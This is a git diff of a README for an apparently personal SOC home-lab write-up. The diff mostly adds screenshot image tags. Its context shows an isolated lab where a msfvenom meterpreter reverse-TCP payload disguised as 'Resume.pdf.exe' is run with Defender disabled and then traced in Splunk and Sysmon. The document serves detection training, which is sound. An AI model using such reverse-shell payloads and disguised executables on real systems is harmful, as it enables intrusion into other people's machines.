@@ -1,12 +1,6 @@
-# SOC-HomeLab-Malware-Analysis
-Created by: Ben Holomah
-Goal: Land a Junior SOC analyst role by May 2026
-This is a "journal entry" of my process creating my first SOC home lab. My purpose in creating it is to help me gain and apply technical skills that I'd be using as a SOC analyst. I want to document the journey, displaying my desire to sharpen my skills and acquire experience using tools used in the field.
-
----
-
 # SOC Home Lab — Malware Analysis & Detection
-
+## Performed By Ben Holomah
+---
 ## Environment Baseline
 - **Hypervisor:** VMware
 - **SIEM:** Splunk 10.2.1
@@ -25,6 +19,7 @@ net user %username%
 ```
 
 [SCREENSHOT: Command prompt showing net user output confirming admin status]
+<img width="1136" height="651" alt="image" src="https://github.com/user-attachments/assets/03747e37-32ce-49c8-bdfd-dcdae4c40798" />
 
 ---
 
@@ -47,6 +42,7 @@ I created a LAN segment in VMware named "LabNetwork" to isolate the lab environm
 5. Confirmed with ipconfig
 
 [SCREENSHOT: ipconfig output showing 192.168.20.10]
+<img width="1016" height="647" alt="Screenshot 2026-03-14 140306" src="https://github.com/user-attachments/assets/fe7a19cb-bb95-48cb-9c8a-bc3197ac1312" />
 
 **Kali Linux — 192.168.20.11**
 1. Right-clicked ethernet icon → Edit Connections
@@ -56,6 +52,7 @@ I created a LAN segment in VMware named "LabNetwork" to isolate the lab environm
 5. Confirmed with ifconfig
 
 [SCREENSHOT: ifconfig output showing 192.168.20.11]
+<img width="679" height="538" alt="Screenshot 2026-03-14 140400" src="https://github.com/user-attachments/assets/7131ab28-2bea-40fc-be06-b04d5ce2a8c0" />
 
 **Troubleshooting: Ping Failures**
 
@@ -65,6 +62,7 @@ New-NetFirewallRule -DisplayName "Allow ICMPv4" -Protocol ICMPv4 -IcmpType 8 -En
 ```
 
 [SCREENSHOT: Successful ping from Kali to Windows 11]
+<img width="622" height="246" alt="image" src="https://github.com/user-attachments/assets/c334a1d4-afea-4d64-a1d1-c5d7906eaf7d" />
 
 ---
 
@@ -73,6 +71,7 @@ New-NetFirewallRule -DisplayName "Allow ICMPv4" -Protocol ICMPv4 -IcmpType 8 -En
 After installation I configured Splunk to ingest Windows Event Logs via Add Data → Monitor → Local Event Logs and selected Application, Security, and System.
 
 [SCREENSHOT: Splunk Add Data review screen showing Application, Security, System selected]
+<img width="1034" height="1078" alt="Screenshot 2026-02-28 174113" src="https://github.com/user-attachments/assets/4445559d-1657-4020-8395-74560af7a1ec" />
 
 ---
 
@@ -84,6 +83,7 @@ To enrich endpoint logging I installed Sysmon using the SwiftOnSecurity configur
 ```
 
 [SCREENSHOT: PowerShell showing Sysmon64 service running]
+<img width="964" height="366" alt="image" src="https://github.com/user-attachments/assets/f27509ff-fd8b-49d6-85c9-1ec8cf4ad933" />
 
 ---
 
@@ -104,6 +104,7 @@ Open ports discovered:
 The -A flag enables aggressive scanning including OS detection and service versioning. The -Pn flag skips host discovery.
 
 [SCREENSHOT: Nmap scan results showing open ports]
+<img width="676" height="535" alt="Screenshot 2026-03-14 152408" src="https://github.com/user-attachments/assets/e58dcb41-2b81-4d88-abbd-6feeb82317ea" />
 
 ---
 
@@ -112,6 +113,7 @@ The -A flag enables aggressive scanning including OS detection and service versi
 Enabled Remote Desktop on Windows 11 via Settings → System → Remote Desktop.
 
 [SCREENSHOT: Windows 11 Remote Desktop settings showing RDP enabled on port 3389]
+<img width="1435" height="778" alt="image" src="https://github.com/user-attachments/assets/0963aa68-c256-4133-9be3-5910fef7d8a5" />
 
 ---
 
@@ -129,6 +131,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -
 Note: Windows Defender was disabled for the purpose of generating telemetry in this lab environment.
 
 [SCREENSHOT: Msfvenom command output showing payload generated]
+<img width="660" height="641" alt="Screenshot 2026-03-14 154149" src="https://github.com/user-attachments/assets/0d957d84-675f-49aa-b291-94cfcae7d050" />
 
 ---
 
@@ -142,6 +145,9 @@ run
 ```
 
 [SCREENSHOT: Metasploit handler running and waiting for connection]
+<img width="675" height="693" alt="Screenshot 2026-03-14 154922" src="https://github.com/user-attachments/assets/20e2c578-b8f7-4fcd-bdb5-3b96ea93b385" />
+
+<img width="750" height="713" alt="Screenshot 2026-03-14 174231" src="https://github.com/user-attachments/assets/3239d86b-caf1-4c0e-99ee-3df1615407de" />
 
 ---
 
@@ -157,6 +163,7 @@ netstat -anob
 I located an established connection back to the Kali machine on port 4444.
 
 [SCREENSHOT: netstat output showing established connection to 192.168.20.11:4444]
+<img width="975" height="510" alt="Screenshot 2026-03-14 161014" src="https://github.com/user-attachments/assets/5d8b2d3a-5e95-4bdd-8aeb-bf3a2b4797e5" />
 
 ---
 
@@ -171,12 +178,17 @@ ipconfig
 ```
 
 [SCREENSHOT: Kali terminal showing Meterpreter session and post-exploitation commands]
+<img width="648" height="691" alt="Screenshot 2026-03-14 161525" src="https://github.com/user-attachments/assets/4e990d14-9b58-4d49-9047-a6de63cc7ad7" />
+
+<img width="760" height="691" alt="Screenshot 2026-03-14 175329" src="https://github.com/user-attachments/assets/9a08e850-c6a7-48ed-b134-0e0156edaa31" />
+<img width="758" height="703" alt="Screenshot 2026-03-14 175401" src="https://github.com/user-attachments/assets/d61bbfd0-c621-4fd8-b5cd-1bf05a5e3fb9" />
 
 ---
 
 ## Detection in Splunk
 
 I created a dedicated index called endpoint to ingest Sysmon data and searched for evidence of the attack.
+<img width="1053" height="815" alt="Screenshot 2026-03-14 163210" src="https://github.com/user-attachments/assets/1a526e38-520f-486c-aa54-99bb3974944a" />
 
 Searching for malware execution:
 ```
@@ -184,6 +196,7 @@ index=endpoint Resume.pdf.exe
 ```
 
 [SCREENSHOT: Splunk results showing Resume.pdf.exe execution]
+<img width="1057" height="1058" alt="Screenshot 2026-03-14 170227" src="https://github.com/user-attachments/assets/fda80ef6-bb35-4d44-868a-7b4b42906488" />
 
 Pivoting on process GUID to trace activity:
 ```
@@ -194,6 +207,8 @@ index=endpoint {process_guid}
 This revealed explorer.exe spawning Resume.pdf.exe, a classic indicator of a user executing a malicious file.
 
 [SCREENSHOT: Splunk table showing ParentImage, Image, and CommandLine]
+<img width="1013" height="968" alt="Screenshot 2026-03-14 170456" src="https://github.com/user-attachments/assets/cdab3297-61d9-4f17-a4e6-cac0d0763d5f" />
+<img width="1323" height="843" alt="Screenshot 2026-03-14 173818" src="https://github.com/user-attachments/assets/ad872bb6-8919-4e84-b0c0-4972a6a3bd04" />
 
 ---
 
